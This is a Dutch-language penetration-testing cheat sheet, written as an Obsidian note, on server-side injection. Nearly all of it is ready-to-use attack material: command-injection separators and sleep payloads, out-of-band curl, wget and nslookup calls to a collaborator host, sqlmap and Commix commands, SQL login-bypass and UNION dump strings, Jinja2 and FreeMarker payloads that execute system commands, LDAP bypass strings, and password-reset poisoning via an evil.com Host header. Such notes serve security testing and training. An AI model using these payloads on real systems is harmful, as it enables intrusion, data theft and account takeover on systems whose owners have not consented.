
Dit is een hele grote en belangrijke categorie. **Injection** staat niet voor niets vaak op nummer 1 of 2 in de OWASP Top 10.

Omdat we XSS (eigenlijk ook een injectie) al hebben gehad, focust deze notitie zich op de **Server-Side Injections**. Dit zijn vaak **Criticals** omdat ze kunnen leiden tot RCE (Remote Code Execution) of volledige database leaks.

Hier is de complete Obsidian notitie voor **Injection Vulnerabilities** (Command, SQL, SSTI, LDAP).

---

Markdown

````
# 💉 Injection Vulnerabilities

==Concept: Onbetrouwbare data wordt naar een interpreter gestuurd als onderdeel van een commando of query.==

---

## 🐚 1. OS Command Injection (RCE)
*De gevaarlijkste variant. Je voert systeemcommando's uit op de server.*

**Waar zoeken?**
Parameters die iets doen met:
* Bestanden (upload, view, convert)
* Netwerk (ping, check url)
* Systeemtaken (backup, mail)

### Command Separators (De sleutel tot succes)
Probeer deze tekens achter een geldige input te plakken om een tweede commando te starten.

| Teken | Uitleg | Linux Payload | Windows Payload |
| :--- | :--- | :--- | :--- |
| `;` | Einde commando (Unix) | `; id` | - |
| `&` | Achtergrondtaak | `& id` | `& whoami` |
| `&&` | AND (als vorige lukt) | `&& id` | `&& whoami` |
| `|` | Pipe (output naar volgende) | `| id` | `| whoami` |
| `||` | OR (als vorige faalt) | `|| id` | `|| whoami` |
| `$()` | Sub-shell | `$(id)` | - |
| `` ` `` | Backticks execution | `` `id` `` | - |
| `%0A` | Newline character | `%0Aid` | - |

### Blind Injection (Time-Based)
Als je geen output ziet, laat de server slapen om te bewijzen dat het werkt.

**Linux:**
```bash
|| sleep 10
; sleep 10
&& sleep 10
````

**Windows:**

DOS

```
& ping -n 10 127.0.0.1
```

### Out-of-Band (OOB)

Gebruik `interactsh` of Burp Collaborator om data naar buiten te sturen.

Bash

```
; curl [http://jouw-collaborator-url.com](http://jouw-collaborator-url.com)
; nslookup jouw-collaborator-url.com
; wget [http://jouw-collaborator-url.com](http://jouw-collaborator-url.com)
```

### Tooling

**Commix** (De "SQLmap" voor Command Injection)

Bash

```
commix --url="[http://target.com?param=TEST](http://target.com?param=TEST)" --batch
```

---

## 🗄️ 2. SQL Injection (SQLi) - Advanced

_Data uit de database stelen. We hebben de basics gehad, dit is de handmatige verdieping._

### Auth Bypass (Login Screens)

Probeer in te loggen als admin zonder wachtwoord.

SQL

```
admin' --
admin' #
admin' OR '1'='1
' OR 1=1--
' OR 1=1#
```

### Union-Based (Data dumpen in de pagina)

Stap 1: Hoeveel kolommen zijn er?

Blijf het getal verhogen tot je een error krijgt.

SQL

```
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
```

_Stap 2: Welke kolom is zichtbaar?_

SQL

```
UNION SELECT 1, 2, 3--
UNION SELECT 'tekst', 2, 3--
```

_Stap 3: Dump data (in de zichtbare kolom, bv. kolom 2)_

SQL

```
UNION SELECT 1, database(), 3--
UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables--
```

### Tooling (SQLMap Full Power)

Als handmatig te traag is:

Bash

```
# Crawl de site en zoek forms
sqlmap -u "[http://target.com](http://target.com)" --forms --batch --crawl=2

# High Risk level (doet ook gevaarlijke tests)
sqlmap -u "[http://target.com?id=1](http://target.com?id=1)" --level=5 --risk=3
```

---

## 📝 3. Server-Side Template Injection (SSTI)

_Injectie in template engines zoals Jinja2 (Python), Twig (PHP) of FreeMarker (Java)._

Detection (De Wiskunde Test)

Voer een rekensom in tussen accolades. Als de server het uitrekent, zit je goed.

|**Input**|**Output (Veilig)**|**Output (Kwetsbaar!)**|
|---|---|---|
|`{{7*7}}`|`{{7*7}}`|`49`|
|`${7*7}`|`${7*7}`|`49`|
|`<%= 7*7 %>`|...|`49`|

Exploitation (RCE via SSTI)

Als {{7*7}} werkt, probeer dan systeemcommando's. De syntax verschilt per engine.

_Python (Jinja2):_

Python

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

_Java (FreeMarker):_

Java

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

---

## 📇 4. LDAP Injection

_Kom je vaak tegen bij Enterprise Login portals (Active Directory)._

**Doel:** Login bypassen of gebruikerslijsten enumereren.

**Auth Bypass:**

Plaintext

```
*
)(cn=*
admin*)((|userpassword=*)
```

---

## 📨 5. Host Header Injection

_Het manipuleren van de `Host` header in je request._

**Password Reset Poisoning:**

1. Vraag een wachtwoord reset aan.
    
2. Intercept request in Burp.
    
3. Verander `Host: target.com` naar `Host: evil.com`.
    
4. Als de link in de email nu naar `evil.com/reset-token...` wijst -> **BOOM**.
    

---

## 🛡️ Checklist voor Injections

- [ ] **Separators:** Heb ik `; | &&` geprobeerd voor Command Injection?
    
- [ ] **Math:** Heb ik `{{7*7}}` geprobeerd in elk tekstveld voor SSTI?
    
- [ ] **Headers:** Heb ik de `Host` en `User-Agent` header getest?
    
- [ ] **Blind:** Heb ik `sleep` payloads gebruikt voor het geval de output verborgen is?
    
- [ ] **Errors:** Heb ik specifieke tekens (`' " \`) gebruikt om een database error te forceren?
    
